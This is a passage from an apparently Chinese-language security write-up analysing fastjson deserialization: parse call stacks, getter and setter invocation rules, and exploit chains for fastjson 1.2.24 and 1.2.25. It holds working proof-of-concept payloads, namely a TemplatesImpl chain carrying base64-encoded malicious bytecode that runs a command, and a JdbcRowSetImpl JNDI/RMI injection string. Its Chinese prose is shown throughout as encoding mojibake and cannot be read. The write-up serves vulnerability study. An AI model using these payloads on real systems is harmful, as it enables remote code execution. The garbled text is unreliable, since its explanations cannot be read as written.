·å°±ä¸èƒ½å°†å…¶è§£æä¸ºä¸€ä¸ªå¯¹è±¡äº†ï¼Œå’Œæˆ‘ä»¬ä¹‹å‰åˆ†æçš„æœ‰å¾ˆå¤§åŒºåˆ«ï¼Œè¿™é‡Œå°±éœ€è¦åˆ©ç”¨åˆ°@typeè¿™ä¸ªå±æ€§äº†ï¼Œå¦‚ä¸‹æµ‹è¯•ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 package fastjson; import com.alibaba.fastjson.JSON; import com.alibaba.fastjson.annotation.JSONField; import com.alibaba.fastjson.JSONObject; public class Fastjson_Test{ public static void main(String[] args) { String string = \u0026#34;{\\\u0026#34;@type\\\u0026#34;:\\\u0026#34;fastjson.Person\\\u0026#34;,\\\u0026#34;user_age\\\u0026#34;:1233,\\\u0026#34;user_name\\\u0026#34;:\\\u0026#34;fupanc\\\u0026#34;}\u0026#34;; JSONObject person1 = JSON.parseObject(string); System.out.println(person1); } } class Person { @JSONField(name=\u0026#34;user_name\u0026#34;) private String name; @JSONField(name=\u0026#34;user_age\u0026#34;) private int age; public Person() { } // Getters and Setters public String getName() { return name; } public void setName(String name){ this.name = name; } public int getAge() { return age; } public void setAge(int age){ this.age = age; } } å…¶å®ä¸»è¦å°±æ˜¯å‰é¢éƒ¨åˆ†æœ‰ç‚¹åŒºåˆ«ï¼Œåé¢éƒ¨åˆ†å’Œå‰é¢è°ƒè¯•åˆ†æçš„ååºåˆ—åŒ–è¿‡ç¨‹å°±å¾ˆæƒ³åƒäº†ï¼Œæˆ‘ä»¬è¿˜æ˜¯æ‰“æ–­ç‚¹äºparseObject()æ–¹æ³•ï¼Œç„¶åä¼šè°ƒç”¨parse()æ–¹æ³•ï¼š\næŒç»­è·Ÿè¿›é‡è½½çš„parse()æ–¹æ³•ï¼Œå¦‚ä¸‹çš„ä»£ç å¤„ç†æ˜¯æœ€å…³é”®çš„ï¼š\nä¼šè°ƒç”¨DefaultJSONParserç±»çš„parse()æ–¹æ³•ï¼Œç„¶åå°±ç»™å‡ºå…³é”®éƒ¨åˆ†å§ï¼Œè¿‡ç¨‹æ¶‰åŠåˆ°çš„ç±»æ¯”è¾ƒå¤šï¼Œè¿˜æ˜¯ç»™ä¸€ä¸ªè°ƒç”¨æ ˆå°±è¡Œäº†ï¼Œè‡ªå·±è°ƒè¯•ä¸€ä¸‹è¿‡ç¨‹å³å¯ï¼Œåˆ°å¦‚ä¸‹å…³é”®ä»£ç å¤„ï¼š\nè¿™é‡Œä¼šè°ƒç”¨TypeUtilsç±»çš„loadClass()æ–¹æ³•ï¼Œæ³¨æ„ä¸€ä¸‹è¿™é‡Œæ¡ä»¶çš„æ»¡è¶³ï¼Œéœ€è¦keyä¸º@typeç­‰ï¼Œå¹¶ä¸”è¿™é‡Œå®é™…æ˜¯è°ƒç”¨ç±»åŠ è½½å™¨æ¥åŠ è½½Personç±»ï¼š\nè°ƒç”¨æ ˆå¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 loadClass:1032, TypeUtils (com.alibaba.fastjson.util) parseObject:322, DefaultJSONParser (com.alibaba.fastjson.parser) parse:1327, DefaultJSONParser (com.alibaba.fastjson.parser) parse:1293, DefaultJSONParser (com.alibaba.fastjson.parser) parse:137, JSON (com.alibaba.fastjson) parse:128, JSON (com.alibaba.fastjson) parseObject:201, JSON (com.alibaba.fastjson) main:10, Fastjson_Test (fastjson) åœ¨è¿”å›äº†è¿™ä¸ªClasså¯¹è±¡åï¼Œç„¶ååˆè·Ÿè¿›ï¼Œåˆ°å¦‚ä¸‹ä»£ç ï¼š\nè¿™é‡Œä¸å°±æ˜¯å‰é¢ååºåˆ—åŒ–æ—¶çš„ä»£ç å—ï¼Œæ‰€ä»¥æ˜¯å¯ä»¥è°ƒç”¨åˆ°setteræ–¹æ³•çš„ï¼Œå°±ä¸åˆ†æäº†ï¼Œå¯ä»¥æˆåŠŸè·å–åˆ°Personç±»å®ä¾‹ï¼š\næ‰€ä»¥æœ€åè¿˜æ˜¯è¿”å›çš„è¿™ä¸ªPersonç±»å¯¹è±¡ï¼Œåªæ˜¯å°†å…¶è½¬æ¢æˆäº†JSONå¯¹è±¡ï¼š è€Œåœ¨è¿™ä¸ªtoJSONæ–¹æ³•ä¸­ï¼Œåˆå­˜åœ¨å‰é¢åˆ†æçš„åºåˆ—åŒ–è¿‡ç¨‹ï¼Œè·Ÿè¿›è¿™ä¸ªtoJSON()æ–¹æ³•ï¼Œåœ¨åç»­é‡è½½çš„toJSON()æ–¹æ³•ä¸­ï¼Œè°ƒç”¨åˆ°äº†å¦‚ä¸‹æ–¹æ³•ï¼š\nä¸€ç›´å¾€åé¢è·Ÿå¯ä»¥çŸ¥é“å°±æ˜¯å‰é¢çš„åºåˆ—åŒ–è¿‡ç¨‹ï¼Œè¿™é‡Œå°±ä¸å¤šè¯´äº†ï¼Œæœ€åè·å–åˆ°çš„å¯¹è±¡å¦‚ä¸‹ï¼š\nç»§ç»­å¾€åé¢çœ‹ï¼š\nè¿™é‡Œçš„getFieldValuesMap()æ–¹æ³•å°±æ˜¯è°ƒç”¨getteræ¥è·å–å€¼ï¼Œç„¶åä»¥é”®å€¼å¯¹å½¢å¼æ”¾å…¥JSONObjectä¸­ï¼Œæœ€åè¿”å›äº†JSONObjectå®ä¾‹ï¼Œä¹Ÿå°±æ˜¯æœ€åè°ƒç”¨parseObject()è·å–åˆ°çš„ä¸œè¥¿ã€‚\nä»ä¸Šé¢çš„æ•´ä¸ªè¿‡ç¨‹æ¥çœ‹ï¼Œå³è°ƒç”¨äº†setterï¼Œè¿˜è°ƒç”¨äº†getterï¼Œåé¢ä»å‡ ä¸ªç‰ˆæœ¬æ¥æ¥çœ‹çœ‹è¿™é‡Œçš„åˆ©ç”¨ç‚¹ã€‚\nè¿™é‡Œè¿˜æœ‰ä¸ªç‚¹ä¸å¾—ä¸è¯´æ˜ï¼šfastjson åœ¨ååºåˆ—åŒ–æ—¶ï¼Œå¦‚æœ Field ç±»å‹ä¸º byte[]ï¼Œå°†ä¼šè°ƒç”¨com.alibaba.fastjson.parser.JSONScanner#bytesValue è¿›è¡Œ base64 è§£ç ï¼Œå¯¹åº”çš„ï¼Œåœ¨åºåˆ—åŒ–æ—¶ä¹Ÿä¼šè¿›è¡Œ base64 ç¼–ç ã€‚å…·ä½“ä½“ç°å°±åœ¨åé¢çš„ä¾‹å­ä¸­è¯´æ˜ã€‚\nè¿˜æœ‰äº›å…¶ä»–è¦æ±‚ï¼Œè¿™é‡Œå°±ä¸å¤šè¯´äº†ï¼Œçœ‹åé¢çš„è°ƒç”¨é“¾ï¼Œå¹¶ä¸”å…¶å®åœ¨å‰é¢çš„ä»£ç è°ƒè¯•åˆ†æä¸­éƒ½æ˜¯æœ‰ä½“ç°çš„ï¼Œåªæ˜¯æ²¡ç»†è¯´ã€‚\nè¡¥å……è¯´æ˜ ä¸»è¦æ˜¯è¡¥å……å‰é¢é—æ¼çš„ä¸€ä¸ªç»†èŠ‚ï¼Œåœ¨å‰é¢çš„åˆ†æä¸­ï¼Œä¹Ÿæ˜¯æåˆ°äº†ä¸€ä¸ªç‚¹ï¼Œåœ¨ååºåˆ—åŒ–çš„æ—¶å€™ï¼Œé™¤äº†ä¼šè°ƒç”¨setterï¼Œè¿˜ä¼šå¤„ç†getterï¼Œåœ¨ä¸€å®šæƒ…å†µä¸‹ï¼Œè¿™ä¸ªçš„getteråˆ©ç”¨æ˜¯éå¸¸å…³é”®ä¸”é‡è¦çš„ï¼Œæˆ‘ä»¬è¿˜æ˜¯ä»¥ä¸Šé¢ååºåˆ—åŒ–çš„ä»£ç è¿›è¡Œæµ‹è¯•ï¼Œåˆ†æå‡ ä¸ªå¿…è¦çš„æ¡ä»¶ï¼Œç„¶åå†ç»™å‡ºä¸€ä¸ªä¾‹å­æ¥è¿›è¡Œè¯æ˜ï¼Œåˆ†æä»£ç è¿˜æ˜¯å¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 package fastjson; import com.alibaba.fastjson.JSON; import com.alibaba.fastjson.annotation.JSONField; public class Fastjson_Test{ public static void main(String[] args) { Person person = new Person(); person.setName(\u0026#34;fupanc\u0026#34;); person.setAge(1233); //åºåˆ—åŒ– System.out.println(\u0026#34;=====åºåˆ—åŒ–=====\u0026#34;); String json = JSON.toJSONString(person); System.out.println(json); //ååºåˆ—åŒ– System.out.println(\u0026#34;=====ååºåˆ—åŒ–=====\u0026#34;); Person person1 = JSON.parseObject(json,Person.class); System.out.println(person1.getName()); System.out.println(person1.getAge()); } } class Person { @JSONField(name=\u0026#34;user_name\u0026#34;) private String name; @JSONField(name=\u0026#34;user_age\u0026#34;) private int age; public Person() { } // Getters and Setters public String getName() { return name; } public void setName(String name){ this.name = name; } public int getAge() { return age; } public void setAge(int age){ this.age = age; } } è¿™é‡Œå°±ç›´æ¥èšç„¦äºååºåˆ—åŒ–äº†ï¼Œå…¶å®é‡ç‚¹å°±æ˜¯ä¸¤ä¸ªåœ°æ–¹ï¼Œæ–¹æ³•çš„è·å–ä»¥åŠè°ƒç”¨ï¼Œå¯¹äºæ–¹æ³•çš„è·å–ï¼Œåœ¨å‰é¢éƒ½æ˜¯æåˆ°äº†ï¼Œå¯¹äºæ–¹æ³•çš„è°ƒç”¨æ˜¯ä¸€ç¬”å¸¦è¿‡çš„ï¼Œè¿™é‡Œå…·ä½“åˆ†æä¸€ä¸‹ï¼Œå½“æ—¶æåˆ°äº†ä¼šæœ‰å¯¹getteræ–¹æ³•çš„å¤„ç†ï¼Œå› ä¸ºæˆ‘ä»¬è¿™é‡Œè·å–æ–¹æ³•æ˜¯ç›´æ¥è°ƒç”¨çš„getMethods()æ¥è¿›è¡Œçš„ï¼Œè¿™é‡Œå…ˆä»ååºåˆ—åŒ–è°ƒç”¨setterçš„ä»£ç æ¥çœ‹ï¼ŒåŸºæœ¬çš„è°ƒç”¨æ˜¯å·®ä¸å¤šçš„ï¼š\nåœ¨å–æ–¹æ³•å¹¶è¿›è¡Œè°ƒç”¨çš„ä»£ç ä½äºï¼š\nåœ¨setValue()æ–¹æ³•çš„è°ƒç”¨ï¼š\nä¹Ÿå°±æ˜¯å‰é¢ä¼ é€’çš„fieldInfoå˜é‡ï¼Œæ­¤æ—¶çš„å˜é‡å®šä¹‰å¦‚ä¸‹ï¼š\næœ€åæ˜¯å†è°ƒç”¨çš„invoke()æ–¹æ³•æ¥è¿›è¡Œçš„æ–¹æ³•è°ƒç”¨ï¼š\nè°ƒç”¨æ ˆä¸ºï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 setAge:42, Person (fastjson) invoke0:-1, NativeMethodAccessorImpl (sun.reflect) invoke:62, NativeMethodAccessorImpl (sun.reflect) invoke:43, DelegatingMethodAccessorImpl (sun.reflect) invoke:497, Method (java.lang.reflect) setValue:96, FieldDeserializer (com.alibaba.fastjson.parser.deserializer) deserialze:593, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer) deserialze:188, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer) deserialze:184, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer) parseObject:639, DefaultJSONParser (com.alibaba.fastjson.parser) parseObject:339, JSON (com.alibaba.fastjson) parseObject:243, JSON (com.alibaba.fastjson) parseObject:456, JSON (com.alibaba.fastjson) main:18, Fastjson_Test (fastjson) æˆ‘ä»¬å†æ¥çœ‹ä¸€ä¸‹å…³é”®çš„sortedFieldDeserializerså˜é‡çš„èµ‹å€¼çš„åœ°æ–¹ï¼š å…¶å®å°±æ˜¯sortedFieldsï¼Œä¹Ÿå°±æ˜¯ä¸Šé¢çš„JavaBeanInfo.build()æ–¹æ³•è°ƒç”¨çš„ç±»å˜é‡çš„ç»“æœï¼š\nå…·ä½“å®ç°åœ¨ï¼š è¿™é‡Œä¹Ÿæ˜¯å‰é¢æ ‡æ³¨å‡ºæ¥çš„ï¼Œæ•°ç»„copyè¿‡ç¨‹ï¼Œè¿™é‡Œå°±æ¶‰åŠåˆ°äº†ä¸€ä¸ªéå¸¸é‡è¦çš„å˜é‡ï¼šfielList ï¼Œä¹Ÿæ˜¯å½¢å‚ä¼ é€’çš„ä¸€ä¸ªå˜é‡ï¼Œå›è¿‡å»çœ‹è¿™ä¸ªå˜é‡çš„èµ‹å€¼æƒ…å†µï¼Œå¯ä»¥å‘ç°ä¸»è¦æ˜¯é€šè¿‡ä¸‹é¢è¿™ä¸ªæ–¹æ³•æ¥è¿›è¡Œèµ‹å€¼çš„ï¼š\nå¹¶ä¸”è¿™ä¸ªæ˜¯å­˜åœ¨äºå¤„ç†getteræ–¹æ³•çš„é€»è¾‘ä¸­çš„ï¼Œæˆ‘ä»¬å»çœ‹ä¸€ä¸‹éœ€è¦å¤„ç†çš„æ¡ä»¶ï¼š\næ–¹æ³•åå­—é•¿åº¦å¾—å¤§äº4ï¼Œç„¶åä¸èƒ½æ˜¯é™æ€æ–¹æ³•ï¼Œç„¶åéœ€è¦ä»¥getå¼€å¤´ï¼Œè¿˜æœ‰æ¡ä»¶å¦‚ä¸‹ï¼š\néœ€è¦æ»¡è¶³è¿™ä¸ªæ–¹æ³•çš„è¿”å›å€¼æ˜¯è¿™å‡ ä¸ªç±»å‹ä¸­çš„å…¶ä¸­ä¸€ä¸ªæ‰èƒ½è¿›å…¥åé¢çš„æ¡ä»¶ï¼Œå¹¶ä¸”è¿˜éœ€è¦è¿™ä¸ªå˜é‡æ²¡æœ‰setterï¼Œåªæœ‰getter ï¼š\nè·Ÿè¿›è¿™é‡Œå…³é”®çš„getField()æ–¹æ³•ï¼š\nä»ä¸Šé¢çš„ä»£ç å¯ä»¥çœ‹å‡ºæ¥ï¼Œè¿™é‡Œéœ€è¦è¿”å›nullï¼Œçœ‹è¿™é‡Œçš„ä»£ç é€»è¾‘ï¼Œå°±æ˜¯åˆ¤æ–­è¿™ä¸ªfieldListæ˜¯å¦æœ‰ç›¸åŒçš„å­—æ®µåç§°ï¼Œè€Œåœ¨å‰é¢çš„fieldListèµ‹å€¼é€»è¾‘ä¸­ï¼Œæ˜¯å…ˆå¤„ç†çš„setterï¼Œç„¶åæ‰æ˜¯å¤„ç†çš„getterï¼Œä¸ºäº†è¿™é‡Œèƒ½è¿”å›nullï¼Œæ‰€ä»¥éœ€è¦è¿™ä¸ªå­—æ®µæ²¡æœ‰setterï¼Œè¿™fieldListä¸­æ‰ä¸ä¼šæœ‰è¿™ä¸ª\u0026quot;name\u0026quot; ï¼ŒåŸºäºä¸Šé¢çš„æ¡ä»¶ï¼Œå¯ä»¥è¿›è¡Œå¦‚ä¸‹ä»£ç æµ‹è¯•ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 package fastjson; import com.alibaba.fastjson.JSON; import java.util.Map; public class Fastjson_Test{ public static void main(String[] args) { Person obj = (Person)JSON.parseObject(\u0026#34;{\\\u0026#34;map\\\u0026#34;:{}}\u0026#34;,Person.class); } } class Person { private Map map; public Person() { } public Map getMap() { try{ java.lang.Runtime.getRuntime().exec(\u0026#34;open -a Calculator\u0026#34;); }catch (Exception e){ e.printStackTrace(); } return map; } } è¿è¡ŒæˆåŠŸå¼¹å‡ºè®¡ç®—æœºã€‚å¦‚ä¸‹å‡ ä¸ªç‚¹è¯´æ˜ï¼š\nä¸ºä»€ä¹ˆæ˜¯ååºåˆ—åŒ–çš„{\u0026quot;map\u0026quot;:{}}ï¼Œå…¶å®è¿™ä¸ªç‚¹æ˜¯åœ¨ä¸‹é¢çš„fastjson\u0026lt;=1.2.24çš„TemplatesImplé“¾è¯´è¿‡çš„ï¼Œä¹Ÿå°±æ˜¯å¦‚æœjsonå­—ç¬¦ä¸²æ²¡æœ‰å¯¹å˜é‡è¿›è¡Œèµ‹å€¼ï¼Œfastjsonä¼šè·å–è¿™ä¸ªå˜é‡çš„é»˜è®¤ç±»å‹çš„æ— å‚æ„é€ æ–¹æ³•è¿›è¡Œå®ä¾‹åŒ–ç„¶åèµ‹å€¼ã€‚ ç„¶åå°±å†è°ƒè¯•çœ‹ä¸€ä¸‹è¿™é‡Œçš„getteræ–¹æ³•çš„è°ƒç”¨ä»£ç å®ç°ï¼Œå‰é¢éƒ½è¿˜æ˜¯å·®ä¸å¤šçš„ï¼Œåˆ©ç”¨ç‚¹å˜äº†ï¼š è·Ÿè¿›è¿™ä¸ªparseField()æ–¹æ³•ï¼š\nè¿™é‡Œè¿˜æ˜¯ä¼šè°ƒç”¨åˆ°setValue()æ–¹æ³•ï¼š æœ€åè¿˜æ˜¯æˆåŠŸè°ƒç”¨invoke()æ–¹æ³•ä»è€Œè°ƒç”¨getMap()æ–¹æ³•ä»è€Œå¼¹å‡ºè®¡ç®—æœºã€‚\nåˆ©ç”¨é“¾å­¦ä¹  fastjson\u0026lt;=1.2.24 ä¸¤æ¡é“¾å­ï¼Œè¿™é‡Œæ¥è°ƒè¯•åˆ†æä¸€ä¸‹ï¼Œä¾èµ–ä¸ºï¼š\n1 2 3 4 5 \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alibaba\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;fastjson\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.2.24\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; TemplatesImplé“¾ æ—¢ç„¶éƒ½æ˜¯å¯ä»¥è°ƒç”¨getterå’Œsetteräº†ï¼Œé‚£ä¹ˆåœ¨JDK8ç¯å¢ƒä¸‹æœ€ç»å…¸çš„è¿˜æ˜¯TemplatesImplé“¾äº†ï¼Œè¿™é‡Œåˆ©ç”¨çš„getteræ–¹æ³•è¿˜æ˜¯getOutputProperties()æ–¹æ³•ï¼Œè¿™ä¸ªæ–¹æ³•å†…éƒ¨ä¼šè°ƒç”¨åˆ°newTransformer()æ–¹æ³•ï¼Œä»è€Œå®Œæˆä¸€æ¬¡å®Œæ•´çš„é“¾å­çš„è°ƒç”¨ï¼ŒPOCå¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 package fastjson; import com.alibaba.fastjson.JSON; import com.alibaba.fastjson.JSONObject; import com.alibaba.fastjson.parser.Feature; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import javassist.ClassClassPath; import javassist.ClassPool; import javassist.CtClass; import java.util.Base64; public class Fastjson_Test { public static void main(String[] args) throws Exception { //ä½¿ç”¨javassistå®šä¹‰æ¶æ„ä»£ç  ClassPool classPool = ClassPool.getDefault(); classPool.insertClassPath(new ClassClassPath(AbstractTranslet.class)); CtClass cc = classPool.makeClass(\u0026#34;Evil\u0026#34;); String cmd= \u0026#34;java.lang.Runtime.getRuntime().exec(\\\u0026#34;open -a Calculator\\\u0026#34;);\u0026#34;; cc.makeClassInitializer().insertBefore(cmd); cc.setSuperclass(classPool.get(AbstractTranslet.class.getName())); byte[] classBytes = cc.toBytecode(); String encodedCode = Base64.getEncoder().encodeToString(classBytes); System.out.println(encodedCode); String json = \u0026#34;{\\\u0026#34;@type\\\u0026#34;:\\\u0026#34;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\\\u0026#34;,\\\u0026#34;_name\\\u0026#34;:\\\u0026#34;fupanc\\\u0026#34;,\\\u0026#34;_bytecodes\\\u0026#34;:[\\\u0026#34;yv66vgAAADQAGwEABEV2aWwHAAEBABBqYXZhL2xhbmcvT2JqZWN0BwADAQAKU291cmNlRmlsZQEACUV2aWwuamF2YQEACDxjbGluaXQ+AQADKClWAQAEQ29kZQEAEWphdmEvbGFuZy9SdW50aW1lBwAKAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwwADAANCgALAA4BABJvcGVuIC1hIENhbGN1bGF0b3IIABABAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7DAASABMKAAsAFAEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQHABYBAAY8aW5pdD4MABgACAoAFwAZACEAAgAXAAAAAAACAAgABwAIAAEACQAAABYAAgAAAAAACrgADxIRtgAVV7EAAAAAAAEAGAAIAAEACQAAABEAAQABAAAABSq3ABqxAAAAAAABAAUAAAACAAY=\\\u0026#34;],\\\u0026#34;_class\\\u0026#34;:null,\\\u0026#34;_tfactory\\\u0026#34;:{},\\\u0026#34;_outputProperties\\\u0026#34;:{}}\u0026#34;; JSONObject jsonObject = JSON.parseObject(json, Feature.SupportNonPublicField); } } è¿è¡Œåå¼¹å‡ºè®¡ç®—æœºï¼Œè¿™é‡Œè®¾ç½®äº†_outputPropertiesæ˜¯ä¸ºäº†å¯ä»¥è°ƒç”¨åˆ°ä»–çš„getteræ–¹æ³•ï¼Œæ³¨æ„ä¸€ä¸‹è¿™é‡Œçš„ä»£ç æ„é€ ï¼Œå¯¹äºbyte[][]ç±»å‹çš„æ•°æ®ï¼Œç”±äºbase64ç¼–ç åªèƒ½ç¼–ç byte[]ç±»å‹çš„æ•°æ®ï¼Œæ‰€ä»¥è¿™å°±åˆåŠ äº†ä¸€ä¸ªæ•°ç»„å°†å…¶è½¬æ¢æˆ[][]ç±»å‹çš„æ•°æ®ã€‚\nè¿™é‡Œå°±è¯´æ˜å‡ ä¸ªç‚¹ï¼Œç®—æ˜¯æ¯”è¾ƒå…³é”®çš„ç‚¹ï¼š\nç½‘ä¸Šæœ‰çš„payloadæ²¡ç®¡_classå˜é‡ï¼Œè¿™æ˜¯å› ä¸ºè¿™ä¸ªå˜é‡é»˜è®¤æ˜¯nullï¼š è¿™é‡Œå¹¶æ²¡æœ‰å¯¹_tfactoryå˜é‡è¿›è¡Œèµ‹å€¼ï¼Œè¿™æ˜¯å› ä¸ºå¦‚æœjsonå­—ç¬¦ä¸²æ²¡æœ‰å¯¹å˜é‡è¿›è¡Œèµ‹å€¼ï¼Œfastjsonä¼šè·å–è¿™ä¸ªå˜é‡çš„é»˜è®¤ç±»å‹çš„æ— å‚æ„é€ æ–¹æ³•è¿›è¡Œå®ä¾‹åŒ–ç„¶åèµ‹å€¼ï¼Œè€Œè¿™é‡Œåˆšå¥½æ˜¯æˆ‘ä»¬éœ€è¦çš„ç±»å‹ï¼š è¿™é‡Œåˆ©ç”¨äº†ä¸€ä¸ªFeature.SupportNonPublicFieldï¼Œè¿™ä¸ªèµ·åˆ°äº†ä»€ä¹ˆä½œç”¨ï¼Œæˆ‘ä»¬åœ¨è·å–æ–¹æ³•æ—¶ï¼Œæ¯”å¦‚setterï¼Œå…¶å®setteråŸºæœ¬éƒ½æ˜¯privateç±»å‹çš„å˜é‡ï¼Œè¿™é‡Œè®¾ç½®è¿™ä¸ªå°±æ˜¯ä¸ºäº†ç”¨æ¥ç»™ç§æœ‰å˜é‡è¿›è¡Œèµ‹å€¼çš„ã€‚ è¿™ä¸ªç®—æ˜¯æ¯”è¾ƒè€ç‰ˆæœ¬çš„äº†ï¼Œå¯ä»¥è°ƒè¯•è·Ÿä¸€ä¸‹ï¼Œè¿™ç±»çš„è¿‡ç¨‹å°±å’Œå‰é¢åˆ†æçš„parseObject()è¿‡ç¨‹æ˜¯ä¸ä¸€æ ·äº†çš„ï¼Œæˆ‘ä»¬è¿™é‡Œè¿˜éœ€è¦ä¼ å…¥å¦å¤–ä¸€ä¸ªFeature.SupportNonPublicFieldï¼Œå…¶å®æ˜¯å¹¶æ²¡æœ‰è°ƒç”¨toJSONçš„ï¼š\nä¹Ÿå°±å’Œå‰é¢åˆ†æçš„è¿‡ç¨‹ä¸ä¸€æ ·äº†ï¼Œæ‰€ä»¥çœŸæ­£è°ƒç”¨getterçš„åœ°æ–¹å¹¶ä¸æ˜¯å‰é¢åˆ†æçš„toJSON()æ–¹æ³•çš„åºåˆ—åŒ–ï¼Œè€Œæ˜¯å¦å¤–çš„åœ°æ–¹ï¼ŒåŸºæœ¬è¿‡ç¨‹åœ¨å‰é¢è¡¥å……è¯´æ˜ä¸­ï¼Œç°åœ¨æ¥çœ‹çœ‹ä¸ºä»€ä¹ˆè¿™ä¸ª_outputPropertieså˜é‡ç¬¦åˆé‚£å‡ ä¸ªæ¡ä»¶ï¼š å˜é‡çš„getteræ–¹æ³•å¦‚ä¸‹ï¼š\nè¿”å›ç±»å‹ä¸ºProperties.classï¼Œå…¶çˆ¶ç±»ä¸ºHashtableï¼Œè€ŒHashtableå®ç°äº†Mapæ¥å£ï¼Œç„¶åè¿™ä¸ªç±»æ²¡æœ‰setteræ–¹æ³•ï¼Œä¸æ˜¯é™æ€æ–¹æ³•ï¼Œé•¿åº¦å¤§äº4ï¼Œå®Œç¾ç¬¦åˆï¼Œè¿™ä¹Ÿå°±æ˜¯ä¸ºä»€ä¹ˆåœ¨ååºåˆ—åŒ–çš„æ—¶å€™è°ƒç”¨åˆ°äº†getteræ–¹æ³•ä»è€Œå®ç°äº†ä¸€æ¬¡è°ƒç”¨é“¾çš„æ‰§è¡Œã€‚\nJdbcRowSetImplé“¾ è¿™é‡Œåˆ©ç”¨åˆ°çš„ç±»æ˜¯jdbcRowSetImplç±»ï¼Œè¿™ä¸ªç±»ä½äºcom.sun.rowset.JdbcRowSetImplï¼Œç®€å•çœ‹äº†ä¸€ä¸‹è¿™ä¸ªç±»ï¼Œå¯ä»¥çœ‹åˆ°ä¸€ä¸ªå¯ä»¥è§¦å‘jndiæ³¨å…¥çš„æ–¹æ³•ï¼š\nçœ‹ä¸€ä¸‹è¿™é‡Œæœ‰æ— è°ƒç”¨connect()æ–¹æ³•çš„ä»£ç ï¼Œæ‰¾åˆ°äº†ä¸€ä¸ªgetterï¼š\nå’Œä¸€ä¸ªsetterï¼š\nå¯¹äºè¿™ä¸ªgetterï¼Œå¯ä»¥æƒ³ä¸€ä¸‹æ˜¯å¦å¯ä»¥åœ¨ååºåˆ—åŒ–çš„æ—¶å€™è°ƒç”¨ï¼Œå¯¹åº”å˜é‡æ— setteræ–¹æ³•ï¼Œè¿”å›å±æ€§ä¸ºDatabaseMetaDataï¼Œä¸æ»¡è¶³é‚£å‡ ä¸ªå±æ€§ä¹‹ä¸€ï¼Œåªèƒ½æ”¾å¼ƒã€‚é‚£ä¹ˆç°åœ¨ç€é‡çœ‹setteræ–¹æ³•ï¼š\néœ€è¦connä¸ºnullï¼Œè€Œåœ¨å‰é¢çš„å­¦ä¹ ä¸­ï¼Œå¯ä»¥çŸ¥é“å®ä¾‹åŒ–ç±»æ—¶æ˜¯è°ƒç”¨çš„newInstance()ï¼Œä¹Ÿå°±æ˜¯ä¼šè°ƒç”¨é»˜è®¤çš„æ„é€ æ–¹æ³•ï¼Œå¯ä»¥çœ‹ä¸€ä¸‹è¿™é‡Œçš„é»˜è®¤çš„æ„é€ æ–¹æ³•ï¼š\nä¼šå°†connè®¾ç½®ä¸ºnullï¼Œç„¶åå†è·Ÿè¿›connect()æ–¹æ³•éœ€è¦çš„å‚æ•°ï¼š\nä¸»è¦å°±æ˜¯è¿™ä¸ªgetDataSourceName()æ–¹æ³•ï¼Œè·Ÿè¿›å‘ç°æ˜¯è¿”å›çš„çˆ¶ç±»BaseRowSetçš„ä¸€ä¸ªå˜é‡ï¼š\nè¿˜æ˜¯ç›´æ¥èµ‹å€¼å³å¯ï¼Œçˆ¶ç±»å­˜åœ¨setteræ–¹æ³•æ¥è¿›è¡Œèµ‹å€¼ï¼š\né‚£ä¹ˆå°±å¯ä»¥å°è¯•æ‰“ä¸€ä¸ªjndiäº†ï¼ˆæ³¨æ„javaçš„ç‰ˆæœ¬ï¼‰ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 package fastjson; import com.alibaba.fastjson.JSON; import com.alibaba.fastjson.JSONObject; public class Fastjson_Test{ public static void main(String[] args) { String json = \u0026#34;{\\\u0026#34;@type\\\u0026#34;:\\\u0026#34;com.sun.rowset.JdbcRowSetImpl\\\u0026#34;,\\\u0026#34;dataSourceName\\\u0026#34;:\\\u0026#34;rmi://127.0.0.1:1099/Hello\\\u0026#34;,\\\u0026#34;autoCommit\\\u0026#34;:\\\u0026#34;true\\\u0026#34;}\u0026#34;; JSONObject obj = JSON.parseObject(json); } } æˆ‘è¿™é‡Œæ˜¯å°è¯•çš„æ‰“rmiï¼ŒåŸºæœ¬æµç¨‹å°±å’Œjndiæ‰“rmiä¸€æ ·çš„ï¼Œæœ€åæˆåŠŸå¼¹å‡ºè®¡ç®—æœºã€‚\n1.2.25\u0026lt;=fastjson\u0026lt;=1.2.41 åœ¨è¿™ä¸ªç‰ˆæœ¬ä¸‹ï¼ŒåŠ äº†é»‘ç™½åå•ï¼Œå…·ä½“ä»¥ç¬¬ä¸€ä¸ªç‰ˆæœ¬ï¼Œåé¢å‡ ä¸ªéƒ½æ˜¯ç»•è¿‡ã€‚\npomä¾èµ–æ”¹æˆï¼š\n1 2 3 4 5 \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alibaba\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;fastjson\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.2.25\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; å…¶å®å°±æ˜¯æ”¹ä¸€ä¸‹ç‰ˆæœ¬å³å¯ã€‚\nå¯ä»¥çœ‹åˆ°åŠ 